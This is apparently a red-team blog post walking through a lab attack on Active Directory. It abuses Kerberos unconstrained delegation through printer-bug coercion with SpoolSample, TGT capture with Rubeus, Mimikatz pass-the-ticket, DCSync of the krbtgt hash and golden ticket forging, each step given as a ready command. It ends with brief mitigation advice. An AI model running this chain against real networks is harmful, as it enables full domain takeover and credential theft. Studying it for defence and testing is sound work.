---
layout: post
title: "Abusing Kerberos unconstrained delegation and DCSync the Domain."
description: "This post demonstrates how to capture the domain controller’s Ticket-Granting-Ticket (TGT) by coerce a domain controller to authenticate to a computer configured with unconstrained delegation."
thumb_image: "screenshots/krbdelg/thumb.png"
tags: [red_team, active_directory]
---

### Introduction.

In the `Active Directory` environment delegation allows an account to impersonate another account to access resources within the network.

There are three known types of delegations allowed with Kerberos:

- Unconstrained delegations.
- Constrained delegations.
- Resource-based constrained delegations.

Unconstrained delegation allows a user or computer with the option "Trust This user/computer for delegation to any service" enabled to impersonate any user authenticated to it and request access to any service.

Today we will be trying to abuse Unconstrained delegation to perform a privilege escalation and become a domain admin.

The following image represents a computer in the Active Directory which is configured for unconstrained delegation:

{% include image.html path="screenshots/krbdelg/1.png" path-detail="screenshots/krbdelg/1.png" alt="Sample image" %}

<br>
<hr>
<br>

### Attack Requirements

- A domain computer with the delegation option "Trust This computer for delegation to any service" enabled.
- Local admin privileges on the delegated computer to dump the TGT tickets. If you compromised the server as a regular user, you would need to escalate to abuse this delegation feature.

<br>
<hr>
<br>

### Tools Used

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [Active Directory Modules](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Rubeus](https://github.com/GhostPack/Rubeus)

<br>
<hr>
<br>

### Identifying The Target.

We are interested with computer objects with the property `TrustedForDelegation` set to `true`:

We can use PowerView to find computers that are configured for Unconstrained Delegation with a syntax :

```powershell
Get-DomainComputer -Unconstrained -Properties useraccountcontrol,dnshostname | fl
```
<br>
{% include image.html path="screenshots/krbdelg/2.png" path-detail="screenshots/krbdelg/2.png" alt="Sample image" %}

<br>
Also using ADModule with the following syntax we can see the same results:

```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```
<br>
{% include image.html path="screenshots/krbdelg/3.png" path-detail="screenshots/krbdelg/3.png" alt="Sample image" %}


As we can see we have two computers in the `STRAWHATS.local` domain with unconstrained delegation:

- The computer is named `DC01.strawhats.local`, which is a domain controller, Domain controllers have unconstrained delegation enabled by default.
- The computer named `BLACKBEARD.strawhats.local` computer which is our target, we are good to attack.

<br>
<hr>
<br>

### Exploitation.

In order to exploit unconstrained delegation we need to compromise the system with the delegation enabled, in this post we’ll assume that we already did it.

The idea is to coerce a privileged user to connect to the computer with the delegation enabled. To achieve this we’re going to use the SpoolSample bug to force a domain controller account to connect to us.

First let us set up Rubeus on the computer we compromised to listen for incoming authenticated connections in order to monitor for incoming connections with Rubeus using the following command:

```powershell
Rubeus.exe monitor /interval:5 /filteruser:DC01
```

<br>
{% include image.html path="screenshots/krbdelg/4.png" path-detail="screenshots/krbdelg/4.png" alt="Sample image" %}

Next, using SpoolSample tools, we trigger the printer bug on a domain controller, We are triggering the bug on host `DC01.strawhats.local` and coercing it to authenticate against the host that we control where we are running Rubeus, `BLACKBEARD.strawhats.local`.

```powershell
SpoolSample.exe DC01.strawhats.local BLACKBEARD.strawhats.local
```

where:

- `DC01.strawhats.local` is the domain controller we want to compromise
- `BLACKBEARD.strawhats.local` is the machine with delegation enabled that we control.

{% include image.html path="screenshots/krbdelg/5.png" path-detail="screenshots/krbdelg/5.png" alt="Sample image" %}

Suddenly, we see the authentication come from DC01 along with its ticket granting ticket (TGT) captured by Rubeus.

{% include image.html path="screenshots/krbdelg/6.png" path-detail="screenshots/krbdelg/6.png" alt="Sample image" %}

From a powershell console we can convert the base64 ticket and write the contents to a file with the .kirbi extension using the following command.

```powershell
[IO.File]::WriteAllBytes("C:\tools\DC.kirbi", [Convert]::FromBase64String("Base64 Ticket String"))
```
<br>
{% include image.html path="screenshots/krbdelg/7.png" path-detail="screenshots/krbdelg/7.png" alt="Sample image" %}

Before we proceed with pass-the-ticket attack and become a domain admin, let's try PSRemoting to the DC01 from BLACKBEARD and check currently available kerberos tickets in a current logon session, just to make sure we currently do not have domain admin rights:

{% include image.html path="screenshots/krbdelg/9.png" path-detail="screenshots/krbdelg/9.png" alt="Sample image" %}

Above picture shows that there are no tickets and PSSession could not be established.

Using Mimikatz we can pass-the-ticket and the current user account will get high privilege rights on the domain controller.

```powershell
mimikatz.exe "kerberos::ptt DC.kirbi"
```

<br>
{% include image.html path="screenshots/krbdelg/8.png" path-detail="screenshots/krbdelg/8.png" alt="Sample image" %}

Then we `DCSync` to dump the `NTLM` hash of the `krbtgt` account.

```powershell
lsadump::dcsync /user:STRAWHATS\krbtgt`
```
<br>
{% include image.html path="screenshots/krbdelg/10.png" path-detail="screenshots/krbdelg/10.png" alt="Sample image" %}

Now let’s forge a golden ticket with Mimikatz for the user STRAWHATS\Administrator:

```powershell
kerberos::golden /user:Administrator /domain:strawhats.local /sid:S-1-5-21-3112608399-2123514497-4142719192-502 /krbtgt:3db0f96a64abc0bc2e4dd779d191d74a /ptt
```
<br>
{% include image.html path="screenshots/krbdelg/11.png" path-detail="screenshots/krbdelg/11.png" alt="Sample image" %}

Now We can try to PSRemote again into the domain controller as the Administrator user :

<br>
{% include image.html path="screenshots/krbdelg/12.png" path-detail="screenshots/krbdelg/12.png" alt="Sample image" %}

As we can see from the above screenshot, the BLACKBEARD computer now contains a krbtgt for STRAWHATS\Administrator, which enables to establish a PSSession to DC01 with an interactive shell with Domain admin privileges.

<br>
<hr>
<br>

### Mitigation.

- Disable kerberos delegation where possible.
- Be cautious of whom you give privilege "Trust This user/computer for delegation to any service".

<br>
<hr>
<br>

##### References.

- [https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)
- [https://adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)
- [https://blog.xpnsec.com/kerberos-attacks-part-1/](https://blog.xpnsec.com/kerberos-attacks-part-1/)
- [https://www.cyberark.com/resources/threat-research-blog/weakness-within-kerberos-delegation](https://www.cyberark.com/resources/threat-research-blog/weakness-within-kerberos-delegation)
